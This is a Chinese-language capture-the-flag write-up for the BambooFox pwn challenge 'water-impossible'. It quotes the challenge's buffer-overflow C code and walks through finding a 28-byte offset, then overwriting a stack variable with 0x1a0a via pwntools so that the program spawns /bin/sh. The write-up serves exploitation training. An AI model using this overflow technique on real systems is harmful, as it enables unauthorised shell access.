# water-impossible

> Challenge Link: [water-impossible](http://ctf.bamboofox.cs.nctu.edu.tw/challenges#water-impossible)
>
> Category: pwn

Welcome !! Challenger ~

Here is a simple challenge for you.

Try to find the key to pass.

`nc bamboofox.cs.nctu.edu.tw 58799`

[water-impossible.zip](http://ctf.bamboofox.cs.nctu.edu.tw/files/bb63dedd19b55a8fab5a08f28dea6269/water-impossible.zip)

## 觀察

觀察一下code後可以發現觸發`system("/bin/sh")`的條件為`(int)token == 6666`

而token是一個宣告在`main`但從未被使用到的變數

```c
if((int)token == 6666){
  printf("wow, That's impossible to touch this token ?!");
  system("/bin/sh");
}
```

另外可以被exploit的部份為`read()`的 buffer overflow

```c
char key[16];
read(0, key, 40);
```

通常這類題目可能的作法有以下兩種

### 蓋 return

如果stack一直往下蓋的話可以碰到`return`，那就直接跳到`system("/bin/sh")`就好了

不過這題有限制長度40，所以沒辦法蓋到return

### 蓋 token

因為`token`也是宣告在stack上，應該可以找到`token`的位置後直接蓋成想要的值

## 解法

以下解法是用蓋token的方法

### 找 paylod 長度

先輸入以下字串來定位

```
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
```

到`if((int)token == 6666)`時 stack 狀態如下

![](https://i.imgur.com/0wDePvP.png)

上圖可以看到`token`的位置以及內容是`[rbp-0x4] : 0x7fffffffdf1c ("DDDDEEEEEEEE0آ\367\377\177")`

由此可知到`token`之前，所需要的 payload 長度是 **28** ，也就是

```
AAAAAAAABBBBBBBBCCCCCCCCDDDD
```

### 蓋token的值

因為這支程式是在 **64位元** 的環境編譯的，所以送的時候要給64位元的位址，使用 pwntool 的話只要用`p64()`就可以囉

```python
r.sendline(payload + p64(0x1a0a))
```
